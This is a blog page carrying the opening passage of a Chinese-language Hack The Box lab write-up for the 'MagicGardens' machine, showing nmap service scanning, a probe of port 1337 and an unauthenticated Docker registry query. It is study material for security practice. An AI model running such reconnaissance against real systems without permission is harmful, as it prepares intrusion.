<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>【season-5】box magicgardens wp | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="USERnmap1234567891011121314151617181920212223242526272829303132333435└─$ sudo nmap -sS 10.129.104.149 -p22,25,80,1337,5000, -sV --min-rate&#x3D;3000Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-05-22">
<meta property="og:type" content="article">
<meta property="og:title" content="【season-5】box magicgardens wp">
<meta property="og:url" content="http://example.com/2024/05/30/box-magicgardens-wp/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="USERnmap1234567891011121314151617181920212223242526272829303132333435└─$ sudo nmap -sS 10.129.104.149 -p22,25,80,1337,5000, -sV --min-rate&#x3D;3000Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-05-22">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2024/magicgardens/background.jpg">
<meta property="article:published_time" content="2024-05-30T06:48:37.000Z">
<meta property="article:modified_time" content="2024-08-23T08:40:31.943Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2024/magicgardens/background.jpg">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>Hexo </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">2</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2024/12/26/Tracks-AD-Support/" title="Tracks-AD-Support" >
            <div class="recent-link-text">
              Tracks-AD-Support
            </div>
          </a>
        
          <a class="recent-link" href="/2024/12/26/Tracks-AD-Authority/" title="Tracks-AD-Authority" >
            <div class="recent-link-text">
              Tracks-AD-Authority
            </div>
          </a>
        
          <a class="recent-link" href="/2024/12/20/crtp-study-note/" title="crtp-study-note" >
            <div class="recent-link-text">
              crtp-study-note
            </div>
          </a>
        
          <a class="recent-link" href="/2024/12/20/Sherlocks-Blizzard-Breakdown/" title="【Sherlocks】Blizzard-Breakdown" >
            <div class="recent-link-text">
              【Sherlocks】Blizzard-Breakdown
            </div>
          </a>
        
          <a class="recent-link" href="/2024/12/19/Sherlocks-Cookie-Consumption/" title="【Sherlocks】Cookie-Consumption" >
            <div class="recent-link-text">
              【Sherlocks】Cookie-Consumption
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-box-magicgardens-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cm4gvs8g1002vzoky2yc6ggos">
        <img src="/wpimages/2024/magicgardens/background.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        【season-5】box magicgardens wp
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-05-30T06:48:37.000Z" itemprop="datePublished">2024-05-30</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/htb-Season-5/">htb-Season-5</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            25k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h2 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo nmap -sS 10.129.104.149 -p22,25,80,1337,5000, -sV --min-rate=3000</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 05:42 EDT</span><br><span class="line">Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 60.00% <span class="keyword">done</span>; ETC: 05:44 (0:00:40 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.104.149 (10.129.104.149)</span><br><span class="line">Host is up (0.47s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span><br><span class="line">25/tcp   open  smtp?</span><br><span class="line">80/tcp   open  http     nginx 1.22.1</span><br><span class="line">1337/tcp open  waste?</span><br><span class="line">5000/tcp open  ssl/http Docker Registry (API: 2.0)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port1337-TCP:V=7.94SVN%I=7%D=5/22%Time=664DBE1E%P=x86_64-pc-linux-gnu%r</span><br><span class="line">SF:(GenericLines,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(GetRequest,15,<span class="string">&quot;\[</span></span><br><span class="line"><span class="string">SF:x\]\x20Handshake\x20error\n\0&quot;</span>)%r(HTTPOptions,15,<span class="string">&quot;\[x\]\x20Handshake\x2</span></span><br><span class="line"><span class="string">SF:0error\n\0&quot;</span>)%r(RTSPRequest,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(RPCC</span><br><span class="line">SF:heck,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(DNSVersionBindReqTCP,15,<span class="string">&quot;\</span></span><br><span class="line"><span class="string">SF:[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(DNSStatusRequestTCP,15,<span class="string">&quot;\[x\]\x20Han</span></span><br><span class="line"><span class="string">SF:dshake\x20error\n\0&quot;</span>)%r(Help,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(Te</span><br><span class="line">SF:rminalServerCookie,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(X11Probe,15,</span><br><span class="line">SF:<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(FourOhFourRequest,15,<span class="string">&quot;\[x\]\x20Han</span></span><br><span class="line"><span class="string">SF:dshake\x20error\n\0&quot;</span>)%r(LPDString,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)</span><br><span class="line">SF:%r(LDAPSearchReq,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(LDAPBindReq,15</span><br><span class="line">SF:,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(LANDesk-RC,15,<span class="string">&quot;\[x\]\x20Handshake</span></span><br><span class="line"><span class="string">SF:\x20error\n\0&quot;</span>)%r(TerminalServer,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%</span><br><span class="line">SF:r(NCP,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(NotesRPC,15,<span class="string">&quot;\[x\]\x20Han</span></span><br><span class="line"><span class="string">SF:dshake\x20error\n\0&quot;</span>)%r(JavaRMI,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r</span><br><span class="line">SF:(ms-sql-s,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(afp,15,<span class="string">&quot;\[x\]\x20Hand</span></span><br><span class="line"><span class="string">SF:shake\x20error\n\0&quot;</span>)%r(giop,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 191.92 seconds</span><br></pre></td></tr></table></figure>

<p>先简单访问下端口看看都是什么服务</p>
<h4 id="1337"><a href="#1337" class="headerlink" title="1337"></a>1337</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[x] Handshake error</span><br><span class="line">�</span><br></pre></td></tr></table></figure>

<h4 id="5000"><a href="#5000" class="headerlink" title="5000"></a>5000</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl -s -k https://10.129.104.149:5000/v2/_catalog|jq</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;errors&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;code&quot;</span>: <span class="string">&quot;UNAUTHORIZED&quot;</span>,</span><br><span class="line">      <span class="string">&quot;message&quot;</span>: <span class="string">&quot;authentication required&quot;</span>,</span><br><span class="line">      <span class="string">&quot;detail&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;Type&quot;</span>: <span class="string">&quot;registry&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Class&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;catalog&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;*&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>80 就是个http了</p>
<hr>
<p>因为5000有认证没法访问</p>
<p>所以突破重心还是放在了web</p>
<p>我先扫了一哈vhost和webdir，vhost没收获，dir倒是爆出来个django</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td 